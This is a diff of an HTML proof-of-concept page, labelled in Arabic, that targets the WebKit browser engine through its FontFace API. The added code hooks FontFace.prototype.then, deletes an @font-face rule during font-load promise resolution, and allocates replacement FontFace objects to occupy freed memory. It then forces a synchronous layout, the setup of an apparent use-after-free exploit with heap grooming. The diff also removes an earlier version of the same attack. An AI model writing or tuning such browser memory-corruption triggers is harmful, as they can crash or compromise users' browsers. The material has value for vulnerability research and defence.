@@ -1,148 +1,86 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>تفكيك ميكانيكية التداخل المنطقي - المرحلة الثالثة المعدلة</title>
+    <title>فحص الثغرة الأصلية - منع OOM</title>
     <style>
-        body {
-            background-color: #121212;
-            color: #e0e0e0;
-            font-family: monospace;
-            padding: 20px;
-            margin: 0;
-        }
-        h2 {
-            color: #00ffcc;
-            border-bottom: 1px solid #333;
-            padding-bottom: 10px;
-        }
-        /* واجهة الـ Console المدمجة على الشاشة */
-        #custom-console {
-            background-color: #000;
-            border: 2px solid #00ffcc;
-            border-radius: 5px;
-            height: 450px;
-            overflow-y: scroll;
-            padding: 15px;
-            margin-top: 20px;
-            box-shadow: 0 0 10px rgba(0, 255, 204, 0.2);
-        }
-        .log-entry {
-            margin-bottom: 8px;
-            line-height: 1.4;
-            border-left: 3px solid #666;
-            padding-left: 8px;
-        }
-        .info { color: #ffffff; }
-        .success { color: #00ff00; border-left-color: #00ff00; }
-        .warn { color: #ffaa00; border-left-color: #ffaa00; }
-        .error { color: #ff3333; border-left-color: #ff3333; }
-        
-        button {
-            background-color: #00ffcc;
-            color: #000;
-            border: none;
-            padding: 10px 20px;
-            font-size: 16px;
-            font-family: monospace;
-            font-weight: bold;
-            cursor: pointer;
-            border-radius: 3px;
-        }
-        button:hover {
-            background-color: #00ccaa;
-        }
+        body { background-color: #121212; color: #e0e0e0; font-family: monospace; padding: 20px; }
+        #custom-console { background-color: #000; border: 2px solid #00ffcc; height: 350px; overflow-y: scroll; padding: 15px; margin-top: 20px; }
+        .log { margin-bottom: 8px; }
+        .warn { color: #ffaa00; }
+        .error { color: #ff3333; }
+        button { background-color: #00ffcc; color: #000; padding: 10px 20px; font-weight: bold; border: none; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <h2>مراقبة سلوك الـ JavaScriptCore & WebCore - كسر الـ Cache</h2>
-    <p>اضغط على الزر أدناه لتفعيل كمين المقاطعة مع إجبار المحرك على تحديث التنسيق الفعلي (Forced Layout Reflow):</p>
+    <h2>فحص استقرار ثغرة FontFace الأصلية</h2>
+    <button onclick="runPoc()">تشغيل الفحص المستقر</button>
     
-    <button onclick="executeForcedInterception()">بدء الفحص المتقدم</button>
-
-    <div id="custom-console">
-        <div class="log-entry success">[نظام المحاكاة نشط]: جاهز لرصد تحولات الذاكرة واختبار حمايات الحالة...</div>
-    </div>
+    <div id="custom-console">[نظام المحاكاة نشط]: جاهز لتتبع المكدس...</div>
 
     <script>
-        // 1. نظام محاكاة الـ Console على الشاشة
+        // نظام العرض على الشاشة
         const consoleElement = document.getElementById('custom-console');
-        
-        function screenLog(message, type = 'info') {
+        function screenLog(msg, isWarn = false) {
             const entry = document.createElement('div');
-            entry.className = `log-entry ${type}`;
-            entry.innerText = `[${new Date().toLocaleTimeString()}] ${message}`;
+            entry.className = isWarn ? 'log warn' : 'log';
+            entry.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
             consoleElement.appendChild(entry);
             consoleElement.scrollTop = consoleElement.scrollHeight;
         }
 
-        // ربط الدوال القياسية بواجهة العرض
-        window.console.log = (msg) => screenLog(msg, 'info');
-        window.console.warn = (msg) => screenLog(msg, 'warn');
-        window.console.error = (msg) => screenLog(msg, 'error');
+        function runPoc() {
+            screenLog("بدء تشغيل الثغرة...");
+            
+            // 1. إعداد البيئة وقاعدة الخط x
+            const style = document.createElement('style');
+            style.id = "s";
+            document.head.appendChild(style);
+            style.sheet.insertRule("@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }", 0);
 
-        // 2. دالة الفحص المتقدم لكسر الكاش وإجبار الـ Reflow
-        function executeForcedInterception() {
-            try {
-                console.log("إعداد بيئة الاختبار الهيكلية...");
+            let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+            document.fonts.add(A);
+            void A.loaded;
 
-                // إنشاء عنصر التنسيق
-                const style = document.createElement('style');
-                document.head.appendChild(style);
-                
-                // حقن قاعدة الخطوط الأساسية
-                style.sheet.insertRule("@font-face { font-family: 'InterceptionFont'; src: url('local://void'); }", 0);
-                console.log("تم حقن قاعدة الـ FontFace بنجاح.");
+            let fired = false;
 
-                // إنشاء كمين المقاطعة عبر كائن الـ Promise
-                const proxyPromise = {
-                    get then() {
-                        console.warn("!! تم تفعيل الكمين البرمجي !! خيط التنفيذ تحت السيطرة الحالية.");
+            // 2. كمين التداخل المنطقي مع منع الـ OOM
+            Object.defineProperty(FontFace.prototype, 'then', {
+                configurable: true,
+                get() {
+                    if (!fired && this === A) {
+                        fired = true;
+                        screenLog("!! تم رصد التداخل بنجاح !!", true);
                         
-                        // تنفيذ أمر الحذف المنطقي
-                        console.log("جاري استدعاء deleteRule(0) لإلغاء الارتباط التنسيقي...");
+                        // حجز كائنات جديدة لمحاولة ملء مساحة الذاكرة
+                        new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
+                        new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
+                        
+                        // الحذف وإجبار التنسيق المتزامن
                         try {
-                            style.sheet.deleteRule(0);
-                            console.log("اكتمل أمر الحذف. الذاكرة في حالة ترقب.");
-                        } catch (e) {
-                            console.error("فشل الحذف البرمجي: " + e.message);
-                        }
-
-                        // إجراء كسر التخزين المؤقت (Invalidate Layout Cache)
-                        console.log("تعديل نظام العرض (display = 'none') لإجبار المحرك على تفريغ الكاش القديم...");
-                        document.body.style.display = 'none';
-
-                        // إجبار المحرك على معالجة الدورة الحسابية الكاملة في منتصف التداخل
-                        console.log("استدعاء document.body.offsetTop لفرض إعادة الحساب المتزامن (Forced Reflow)...");
+                            document.getElementById('s').sheet.deleteRule(0);
+                            screenLog("تم حذف القاعدة بنجاح.");
+                        } catch(e) { screenLog("فشل الحذف: " + e.message, true); }
                         
-                        let forcedOffset = document.body.offsetTop;
-                        console.log(`النتيجة المسترجعة: ${forcedOffset}`);
-
-                        // إعادة بناء بيئة العرض للحفاظ على استقرار الواجهة بعد الفحص
-                        document.body.style.display = 'block';
-                        console.log("إعادة النمط الافتراضي للمستند (display = 'block').");
-                        
-                        return function(resolve) { resolve(); };
+                        let offset = document.body.offsetTop;
+                        screenLog("قيمة الـ Offset المسترجعة: " + offset);
                     }
-                };
+                    
+                    // الحل الهندسي: إرجاع دالة تقوم بعمل resolve بدلاً من undefined لمنع الـ OOM
+                    return function(resolve) { 
+                        if (resolve) resolve(); 
+                    };
+                }
+            });
 
-                // جدولة العملية داخل الـ Microtask Queue لمحاكاة الـ Promise Resolution
-                console.log("توجيه الكائن إلى الـ Event Loop...");
-                Promise.resolve(proxyPromise).then((obj) => {
-                    if(obj && obj.then) {
-                        obj.then(() => {});
-                    }
-                });
-
-            } catch (err) {
-                console.error("خطأ ميكانيكي غير متوقع: " + err.message);
-            }
+            // 3. إطلاق دالة الـ load الرسمية لتفعيل الـ Layout Pipeline
+            screenLog("إطلاق دالة document.fonts.load...");
+            document.fonts.load('1em x', 'AB');
         }
 
-        // الحارس الوقائي لالتقاط الانهيارات البرمجية والأخطاء الفادحة
-        window.onerror = function(message, source, lineno, colno, error) {
-            console.error(`[مراقب النظام]: تم رصد استثناء أو انهيار آمن: ${message} | السطر: ${lineno}`);
+        window.onerror = function(msg) {
+            screenLog("خطأ في النظام: " + msg, true);
             return true;
         };
     </script>
